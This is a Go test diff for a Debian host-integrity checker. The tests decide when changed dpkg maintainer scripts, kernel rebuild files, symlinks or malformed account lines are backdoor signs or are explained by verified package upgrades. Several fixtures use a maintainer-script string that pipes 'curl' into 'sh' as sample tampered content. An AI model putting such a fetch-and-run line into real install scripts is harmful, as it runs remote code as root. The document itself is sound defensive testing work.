@@ -1477,10 +1477,15 @@ func TestJudgePackageDirsAndLinksAreChecked(t *testing.T) {
 	c := clone(old)
 	setFile(c, model.FileEntry{Path: "/usr/bin/sudoedit", Type: "symlink", Target: "/opt/x/sudo", Mode: 0o120777})
 	must(t, run(c, snapOf(old), archive()), "snap.file_modified:/usr/bin/sudoedit", model.SevBackdoor)
-	// Retargeted within them during an upgrade: part of the upgrade.
+	// Retargeted within them during an upgrade: shown with the upgrade,
+	// which is explained only when something confirmed the new version.
 	setVersion(c, "sudo", "1.9.13p3-1+deb12u2")
 	setFile(c, model.FileEntry{Path: "/usr/bin/sudoedit", Type: "symlink", Target: "/usr/libexec/sudo/sudoedit", Mode: 0o120777})
-	absent(t, run(c, snapOf(old), archive()), "snap.file_modified:/usr/bin/sudoedit")
+	r := run(c, snapOf(old), archive())
+	absent(t, r, "snap.file_modified:/usr/bin/sudoedit")
+	if f := must(t, r, "snap.pkg_upgraded:sudo", model.SevNote); !hasEvidencePath(f, "/usr/bin/sudoedit") || explained(r, "explained:sudo") != nil {
+		t.Errorf("unconfirmed upgrade: %+v", f)
+	}
 }
 
 // I5: the machine's own checksums never explain a content change at the
@@ -2214,9 +2219,10 @@ func TestJudgeSecondArchitectureInstall(t *testing.T) {
 	}
 }
 
-// R62: a dpkg maintainer script runs as root at the next package
-// operation, so a changed one folds into a package change only when the
-// new version is confirmed; dpkg's other records still fold.
+// R62, R65: a dpkg maintainer script runs as root at the next package
+// operation, so a changed one is part of a package change only when package
+// verification matched it with the signed package; dpkg's other records
+// still fold.
 func TestJudgeMaintainerScripts(t *testing.T) {
 	old := clean()
 	old.Files = append(old.Files,
@@ -2238,12 +2244,22 @@ func TestJudgeMaintainerScripts(t *testing.T) {
 	}
 	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.md5sums")
 
-	// The upgrade confirmed by a verified file: its scripts are its own.
+	// The upgrade confirmed by a verified program does not vouch for the
+	// scripts: each is compared with the signed package itself.
 	setFile(cur, file("/usr/bin/openssl", "openssl 3.0.15", 0o755))
-	res := archive(pkgverify.FileVerdict{Path: "/usr/bin/openssl", Package: "openssl", Version: "3.0.15-1~deb12u1", Expected: h("openssl 3.0.15"), Actual: h("openssl 3.0.15"), Source: "archive"})
-	r = run(cur, snapOf(old), res)
+	program := pkgverify.FileVerdict{Path: "/usr/bin/openssl", Package: "openssl", Version: "3.0.15-1~deb12u1", Expected: h("openssl 3.0.15"), Actual: h("openssl 3.0.15"), Source: "archive"}
+	r = run(cur, snapOf(old), archive(program))
+	must(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.postinst", model.SevBackdoor)
+
+	// Scripts that match the signed package are part of the upgrade.
+	r = run(cur, snapOf(old), archive(program,
+		pkgverify.FileVerdict{Path: "/var/lib/dpkg/info/openssl.postinst", Package: "openssl", Version: "3.0.15-1~deb12u1", Expected: h("#!/bin/sh\ncurl x|sh"), Actual: h("#!/bin/sh\ncurl x|sh"), Source: "archive"},
+		pkgverify.FileVerdict{Path: "/var/lib/dpkg/info/openssl.triggers", Package: "openssl", Version: "3.0.15-1~deb12u1", Expected: h("interest /usr/bin"), Actual: h("interest /usr/bin"), Source: "archive"}))
 	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.postinst")
 	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.triggers")
+	if g := explained(r, "explained:openssl"); g == nil || !hasEvidencePath(g, "/var/lib/dpkg/info/openssl.postinst") {
+		t.Errorf("verified scripts are not shown with the upgrade: %+v", g)
+	}
 }
 
 // R63: a recorded version change with no changed files that nothing
@@ -2268,4 +2284,309 @@ func TestJudgeVersionOnlyChange(t *testing.T) {
 	if explained(r, "explained:openssl") == nil {
 		t.Errorf("confirmed upgrade not explained")
 	}
+}
+
+const info = "/var/lib/dpkg/info/"
+
+func verdict(p, name, version, content string) pkgverify.FileVerdict {
+	return pkgverify.FileVerdict{Path: p, Package: name, Version: version, Expected: h(content), Actual: h(content), Source: pkgverify.SourceArchive}
+}
+
+func severest(r *model.Report) model.Severity {
+	top := model.SevExplained
+	for _, f := range r.Findings {
+		if f.Severity > top {
+			top = f.Severity
+		}
+	}
+	return top
+}
+
+// kernelUpdate is a routine kernel update between the snapshot and now:
+// the new kernel package, its maintainer script, and everything its
+// installation rebuilds.
+func kernelUpdate() (old, cur *model.Collection) {
+	old = clean()
+	old.Packages.Installed = append(old.Packages.Installed, pkg("linux-image-6.1.0-25-amd64", "6.1.106-3", "/boot/vmlinuz-6.1.0-25-amd64"))
+	old.Files = append(old.Files,
+		file("/boot/vmlinuz-6.1.0-25-amd64", "k25", 0o644),
+		file("/boot/initrd.img-6.1.0-25-amd64", "initrd 25", 0o644),
+		file("/lib/modules/6.1.0-25-amd64/modules.dep", "dep 25", 0o644),
+		file("/boot/grub/grub.cfg", "menu 25", 0o444))
+	cur = clone(old)
+	cur.Packages.Installed = append(cur.Packages.Installed, pkg("linux-image-6.1.0-27-amd64", "6.1.115-1",
+		"/boot/vmlinuz-6.1.0-27-amd64", "/lib/modules/6.1.0-27-amd64/kernel/fs/ext4/ext4.ko"))
+	cur.Files = append(cur.Files,
+		file("/boot/vmlinuz-6.1.0-27-amd64", "k27", 0o644),
+		file("/lib/modules/6.1.0-27-amd64/kernel/fs/ext4/ext4.ko", "ext4", 0o644),
+		file(info+"linux-image-6.1.0-27-amd64.postinst", "#!/bin/sh\nlinux-update-symlinks install 6.1.0-27-amd64", 0o755),
+		file(info+"linux-image-6.1.0-27-amd64.list", "list", 0o644),
+		file("/boot/initrd.img-6.1.0-27-amd64", "initrd 27", 0o644),
+		file("/lib/modules/6.1.0-27-amd64/modules.dep", "dep 27", 0o644),
+		file("/lib/modules/6.1.0-27-amd64/modules.alias", "alias 27", 0o644),
+		file("/lib/modules/6.1.0-27-amd64/modules.symbols", "sym 27", 0o644))
+	setFile(cur, file("/boot/grub/grub.cfg", "menu 27", 0o444))
+	return old, cur
+}
+
+var kernelPaths = []string{"/boot/vmlinuz-6.1.0-27-amd64", "/lib/modules/6.1.0-27-amd64/kernel/fs/ext4/ext4.ko", info + "linux-image-6.1.0-27-amd64.postinst"}
+
+var rebuiltPaths = []string{"/boot/initrd.img-6.1.0-27-amd64", "/lib/modules/6.1.0-27-amd64/modules.dep", "/lib/modules/6.1.0-27-amd64/modules.alias",
+	"/lib/modules/6.1.0-27-amd64/modules.symbols", "/boot/grub/grub.cfg"}
+
+func kernelUnverifiable(kind, reason string) *pkgverify.Result {
+	res := &pkgverify.Result{Mode: pkgverify.ModeArchive}
+	for _, p := range kernelPaths {
+		res.Unverifiable = append(res.Unverifiable, pkgverify.FileVerdict{Path: p, Package: "linux-image-6.1.0-27-amd64", Version: "6.1.115-1", Reason: reason, Kind: kind})
+	}
+	return res
+}
+
+// R66: a real outage (the host's own indexes could not be read) during a
+// routine kernel update is one note. Nothing could confirm the new kernel
+// package, so the files its installation rebuilt and its maintainer script
+// join the files that could not be checked instead of becoming a backdoor
+// sign each.
+func TestJudgeOutageDuringKernelUpdateIsOneNote(t *testing.T) {
+	old, cur := kernelUpdate()
+	res := kernelUnverifiable(pkgverify.KindUnreachable, "could not read the official archive index: dial tcp: i/o timeout")
+	res.Errors = []string{"https://deb.debian.org/debian/dists/bookworm/InRelease: dial tcp: i/o timeout"}
+	r := run(cur, snapOf(old), res)
+	if top := severest(r); top > model.SevNote || r.ExitCode != 1 {
+		t.Fatalf("an outage during a kernel update: severest %v, exit %d, findings %v", top, r.ExitCode, keys(r))
+	}
+	f := must(t, r, "pkg.unchecked_changes", model.SevNote)
+	for _, p := range append(append([]string(nil), kernelPaths...), rebuiltPaths...) {
+		if !hasEvidencePath(f, p) {
+			t.Errorf("the unchecked note lacks %s", p)
+		}
+		absent(t, r, "snap.file_added:"+p)
+		absent(t, r, "snap.file_modified:"+p)
+	}
+	if !strings.Contains(f.Title, "could not be checked because the package archive could not be reached") {
+		t.Errorf("title %q", f.Title)
+	}
+	if g := explained(r, "explained:linux-image-6.1.0-27-amd64"); g != nil {
+		t.Errorf("a kernel package nothing checked is explained: %+v", g)
+	}
+}
+
+// With the archive reachable, a kernel version no trusted source has
+// explains nothing: the rebuilt files stay backdoor signs, and they do not
+// claim that no package changed.
+func TestJudgeUnconfirmedRebuilderWording(t *testing.T) {
+	old, cur := kernelUpdate()
+	res := kernelUnverifiable(pkgverify.KindNotFound, pkgverify.ReasonNotOfficial)
+	res.SourcesUsed = []string{"https://deb.debian.org/debian bookworm"}
+	r := run(cur, snapOf(old), res)
+	absent(t, r, "pkg.unchecked_changes")
+	f := must(t, r, "snap.file_added:/boot/initrd.img-6.1.0-27-amd64", model.SevBackdoor)
+	if strings.Contains(f.Why, "none of them changed") || !strings.Contains(f.Why, "linux-image-6.1.0-27-amd64") || !strings.Contains(f.Why, "no trusted source confirmed") {
+		t.Errorf("why %q: it must name the changed package that nothing confirmed", f.Why)
+	}
+	must(t, r, "snap.file_added:"+info+"linux-image-6.1.0-27-amd64.postinst", model.SevBackdoor)
+
+	// No package that rebuilds an initramfs changed at all: the old wording.
+	old2 := clean()
+	old2.Files = append(old2.Files, file("/boot/initrd.img-6.1.0-25-amd64", "initrd", 0o644))
+	cur2 := clone(old2)
+	setFile(cur2, file("/boot/initrd.img-6.1.0-25-amd64", "initrd with implant", 0o644))
+	f = must(t, run(cur2, snapOf(old2), archive()), "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64", model.SevBackdoor)
+	if !strings.Contains(f.Why, "none of them changed since the snapshot") {
+		t.Errorf("why %q", f.Why)
+	}
+}
+
+// R65: a routine install of a library with nothing in the default check
+// scope. Package verification compared its maintainer scripts with the
+// signed package, which confirms the install: no backdoor signs.
+func TestJudgeVerifiedMaintainerScriptsConfirmAnInstall(t *testing.T) {
+	const postinst, prerm = "#!/bin/sh\npy3compile -p python3-requests", "#!/bin/sh\npy3clean -p python3-requests"
+	old := clean()
+	cur := clone(old)
+	cur.Packages.Installed = append(cur.Packages.Installed, pkg("python3-requests", "2.28.1+dfsg-1", "/usr/lib/python3/dist-packages/requests/__init__.py"))
+	cur.Files = append(cur.Files,
+		file("/usr/lib/python3/dist-packages/requests/__init__.py", "py", 0o644),
+		file(info+"python3-requests.list", "list", 0o644),
+		file(info+"python3-requests.md5sums", "sums", 0o644),
+		file(info+"python3-requests.postinst", postinst, 0o755),
+		file(info+"python3-requests.prerm", prerm, 0o755))
+	const v = "2.28.1+dfsg-1"
+	r := run(cur, snapOf(old), archive(
+		verdict("/usr/lib/python3/dist-packages/requests/__init__.py", "python3-requests", v, "py"),
+		verdict(info+"python3-requests.postinst", "python3-requests", v, postinst),
+		verdict(info+"python3-requests.prerm", "python3-requests", v, prerm)))
+	if top := severest(r); top > model.SevNote || r.ExitCode != 1 {
+		t.Fatalf("a routine library install: severest %v, exit %d, findings %v", top, r.ExitCode, keys(r))
+	}
+	f := must(t, r, "snap.pkg_installed:python3-requests", model.SevNote)
+	for _, s := range []string{"postinst", "prerm"} {
+		absent(t, r, "snap.file_added:"+info+"python3-requests."+s)
+		if !hasEvidencePath(f, info+"python3-requests."+s) {
+			t.Errorf("the install lacks its %s", s)
+		}
+	}
+
+	// A script that differs from the signed package is tampering, and one
+	// package verification could not place is still a backdoor sign.
+	res := archive(verdict("/usr/lib/python3/dist-packages/requests/__init__.py", "python3-requests", v, "py"))
+	res.Mismatch = []pkgverify.FileVerdict{{Path: info + "python3-requests.postinst", Package: "python3-requests", Version: v, Expected: h(postinst), Actual: h("evil"),
+		Reason: "differs from the maintainer script in the signed package", Kind: pkgverify.KindContentDiffers, Source: pkgverify.SourceArchive}}
+	setFile(cur, file(info+"python3-requests.postinst", "evil", 0o755))
+	r = run(cur, snapOf(old), res)
+	f = must(t, r, "pkg.mismatch:"+info+"python3-requests.postinst", model.SevTampering)
+	// A reinstall runs the package's old scripts: the fix must move the
+	// tampered one away first.
+	if rm, re := strings.Index(f.Fix, "rm -- "), strings.Index(f.Fix, "apt-get install --reinstall"); rm < 0 || re < rm || !strings.Contains(f.Why, "runs") {
+		t.Errorf("fix %q, why %q", f.Fix, f.Why)
+	}
+	must(t, r, "snap.file_added:"+info+"python3-requests.prerm", model.SevBackdoor)
+
+	// The machine's own checksums do not cover maintainer scripts: in
+	// offline mode they belong to a package change those checksums confirm.
+	setFile(cur, file(info+"python3-requests.postinst", postinst, 0o755))
+	off := &pkgverify.Result{Mode: pkgverify.ModeOfflineLocal, Errors: []string{pkgverify.OfflineWarning}, Verified: []pkgverify.FileVerdict{
+		{Path: "/usr/lib/python3/dist-packages/requests/__init__.py", Package: "python3-requests", Version: v, Expected: "md5:aa", Actual: "md5:aa", Source: pkgverify.SourceOfflineLocal}}}
+	r = run(cur, snapOf(old), off)
+	absent(t, r, "snap.file_added:"+info+"python3-requests.postinst")
+	absent(t, r, "snap.file_added:"+info+"python3-requests.prerm")
+}
+
+// A package removed but not purged keeps its postrm, which runs on purge.
+// An edited one is a backdoor sign, not part of the removal; one that
+// matches the signed package of the removed version is.
+func TestJudgePostrmOfRemovedPackage(t *testing.T) {
+	const postrm = info + "jq.postrm"
+	old := clean()
+	old.Packages.Installed = append(old.Packages.Installed, pkg("jq", "1.6-2.1", "/usr/bin/jq"))
+	old.Files = append(old.Files, file("/usr/bin/jq", "jq 1", 0o755), file(postrm, "#!/bin/sh\nexit 0", 0o755))
+	cur := clone(old)
+	removePkg(cur, "jq")
+	cur.Packages.Residual = []model.Package{{Name: "jq", Version: "1.6-2.1", Arch: "amd64", Status: "deinstall ok config-files"}}
+	cur.Files = slices.DeleteFunc(cur.Files, func(e model.FileEntry) bool { return e.Path == "/usr/bin/jq" })
+	setFile(cur, file(postrm, "#!/bin/sh\ncurl x|sh", 0o755))
+
+	// Nothing verified it (a scan that could not place it).
+	r := run(cur, snapOf(old), archive())
+	f := must(t, r, "snap.file_modified:"+postrm, model.SevBackdoor)
+	if !strings.Contains(f.Why, "runs as root") {
+		t.Errorf("why %q", f.Why)
+	}
+	if hasEvidencePath(must(t, r, "snap.pkg_removed:jq", model.SevNote), postrm) {
+		t.Errorf("the edited postrm is folded into the removal")
+	}
+
+	// It differs from the signed package's postrm: tampering.
+	res := archive()
+	res.Mismatch = []pkgverify.FileVerdict{{Path: postrm, Package: "jq", Version: "1.6-2.1", Expected: h("#!/bin/sh\nexit 0"), Actual: h("#!/bin/sh\ncurl x|sh"),
+		Reason: "differs from the maintainer script in the signed package", Kind: pkgverify.KindContentDiffers, Source: pkgverify.SourceArchive}}
+	must(t, run(cur, snapOf(old), res), "pkg.mismatch:"+postrm, model.SevTampering)
+
+	// The postrm of the version that was removed (upgraded, then removed,
+	// since the snapshot): verified, so it is part of the removal.
+	cur.Packages.Residual[0].Version = "1.6-2.2"
+	setFile(cur, file(postrm, "#!/bin/sh\nexit 0 # 2.2", 0o755))
+	r = run(cur, snapOf(old), archive(verdict(postrm, "jq", "1.6-2.2", "#!/bin/sh\nexit 0 # 2.2")))
+	absent(t, r, "snap.file_modified:"+postrm)
+	if !hasEvidencePath(must(t, r, "snap.pkg_removed:jq", model.SevNote), postrm) {
+		t.Errorf("the verified postrm is not shown with the removal")
+	}
+	// A verdict for another version than the one dpkg records confirms nothing.
+	r = run(cur, snapOf(old), archive(verdict(postrm, "jq", "1.6-2.1", "#!/bin/sh\nexit 0 # 2.2")))
+	must(t, r, "snap.file_modified:"+postrm, model.SevBackdoor)
+}
+
+// A line with an empty name is used by glibc (lookups by id match it), a
+// line it cannot parse is skipped: the finding says which.
+func TestJudgeMalformedAccountLineWording(t *testing.T) {
+	c := clean()
+	c.Accounts.Malformed = []string{"/etc/passwd:1 (empty name, uid 0)", "/etc/passwd:7", "/etc/group:3 (empty name, gid 27, members eve)", "/etc/shadow:2 (empty name)"}
+	r := run(c, nil, archive())
+	for _, k := range []string{"/etc/passwd:1 (empty name, uid 0)", "/etc/group:3 (empty name, gid 27, members eve)", "/etc/shadow:2 (empty name)"} {
+		f := must(t, r, "acct.malformed:"+k, model.SevBackdoor)
+		if strings.Contains(f.Why, "glibc skips") || strings.Contains(f.Evidence[0].Detail, "rejected") || !strings.Contains(f.Why, "glibc uses this line") {
+			t.Errorf("%s: why %q, detail %q: glibc uses an empty-name line", k, f.Why, f.Evidence[0].Detail)
+		}
+	}
+	if f := must(t, r, "acct.malformed:/etc/passwd:1 (empty name, uid 0)", model.SevBackdoor); !strings.Contains(f.Why, "user id") {
+		t.Errorf("passwd why %q", f.Why)
+	}
+	f := must(t, r, "acct.malformed:/etc/passwd:7", model.SevBackdoor)
+	if !strings.Contains(f.Why, "glibc skips this line") || f.Evidence[0].Detail != "rejected by glibc's parser" {
+		t.Errorf("rejected line: why %q, detail %q", f.Why, f.Evidence[0].Detail)
+	}
+}
+
+// With a release telltale does not verify, nothing was looked up: the
+// package change must not say that no trusted source confirmed it.
+func TestJudgeUnsupportedReleaseUpgradeWording(t *testing.T) {
+	old := clean()
+	old.Host.OSVersionID = "11"
+	old.Packages.Installed = append(old.Packages.Installed, pkg("jq", "1.6-2.1", "/usr/bin/jq"))
+	old.Files = append(old.Files, file("/usr/bin/jq", "jq 1", 0o755))
+	cur := clone(old)
+	setVersion(cur, "jq", "1.6-2.1+deb11u1")
+	setFile(cur, file("/usr/bin/jq", "jq 2", 0o755))
+	res := &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{
+		{Path: "/usr/bin/jq", Package: "jq", Version: "1.6-2.1+deb11u1", Reason: `release not supported for package verification: "debian" "11"`, Kind: pkgverify.KindRelease}}}
+	f := must(t, run(cur, snapOf(old), res), "snap.pkg_upgraded:jq", model.SevBackdoor)
+	for _, s := range []string{f.Title, f.Why} {
+		if strings.Contains(s, "no trusted source") || strings.Contains(s, "Verification ran") || !strings.Contains(s, "package verification did not run") {
+			t.Errorf("%q: verification never ran, and it must say so", s)
+		}
+	}
+	for _, e := range f.Evidence {
+		if strings.Contains(e.Detail, "no trusted source") {
+			t.Errorf("evidence %q", e.Detail)
+		}
+	}
+}
+
+// R60: a version nothing confirmed explains none of its changed files,
+// symbolic links and directories included: a version typed into dpkg
+// status must not make a retargeted link part of an "upgrade".
+func TestJudgeUnconfirmedVersionExplainsNoLinkOrDirectory(t *testing.T) {
+	link := func(target string) model.FileEntry {
+		return model.FileEntry{Path: "/usr/bin/awk", Type: "symlink", Target: target, Mode: 0o120777, MTime: taken, CTime: taken}
+	}
+	old := clean()
+	old.Packages.Installed = append(old.Packages.Installed, pkg("mawk", "1.3.4.20200120-3.1", "/usr/bin/mawk", "/usr/bin/awk", "/usr/share/mawk"))
+	old.Files = append(old.Files, file("/usr/bin/mawk", "mawk", 0o755), link("mawk"))
+	cur := clone(old)
+	setVersion(cur, "mawk", "1.3.4.20200120-3.2")
+	setFile(cur, link("/usr/local/bin/awk"))
+	cur.Files = append(cur.Files, model.FileEntry{Path: "/usr/share/mawk", Type: "dir", Mode: 0o040755, MTime: changed, CTime: changed})
+
+	r := run(cur, snapOf(old), archive())
+	if len(r.Explained) != 0 || r.ExitCode == 0 {
+		t.Fatalf("explained %+v, exit %d: nothing confirmed this version", r.Explained, r.ExitCode)
+	}
+	f := must(t, r, "snap.pkg_upgraded:mawk", model.SevNote)
+	if !hasEvidencePath(f, "/usr/bin/awk") || !hasEvidencePath(f, "/usr/share/mawk") {
+		t.Errorf("the unconfirmed upgrade does not list its link and directory: %+v", f.Evidence)
+	}
+
+	// The real upgrade, its program verified: they are part of it.
+	setFile(cur, file("/usr/bin/mawk", "mawk 2", 0o755))
+	r = run(cur, snapOf(old), archive(verdict("/usr/bin/mawk", "mawk", "1.3.4.20200120-3.2", "mawk 2")))
+	g := explained(r, "explained:mawk")
+	if g == nil || !hasEvidencePath(g, "/usr/bin/awk") || !hasEvidencePath(g, "/usr/share/mawk") || r.ExitCode != 0 {
+		t.Errorf("confirmed upgrade: explained %+v, exit %d, findings %v", g, r.ExitCode, keys(r))
+	}
+}
+
+// R64: the machine's clock decides nothing in package verification; when it
+// disagrees with the archive's signed date the report says so.
+func TestJudgeClockSkewIsANote(t *testing.T) {
+	res := archive()
+	res.ClockSkew = &pkgverify.ClockSkew{Clock: now.Add(8 * 24 * time.Hour), Signed: now}
+	f := must(t, run(clean(), nil, res), "pkg.clock_skew", model.SevNote)
+	if !strings.Contains(f.Title, "8 days ahead") || !strings.Contains(f.Why, "2026-11-22") || !strings.Contains(f.Why, "2026-11-30") {
+		t.Errorf("title %q, why %q", f.Title, f.Why)
+	}
+	res.ClockSkew = &pkgverify.ClockSkew{Clock: now.Add(-50 * time.Hour), Signed: now}
+	if f := must(t, run(clean(), nil, res), "pkg.clock_skew", model.SevNote); !strings.Contains(f.Title, "2 days behind") {
+		t.Errorf("title %q", f.Title)
+	}
+	absent(t, run(clean(), nil, archive()), "pkg.clock_skew")
 }
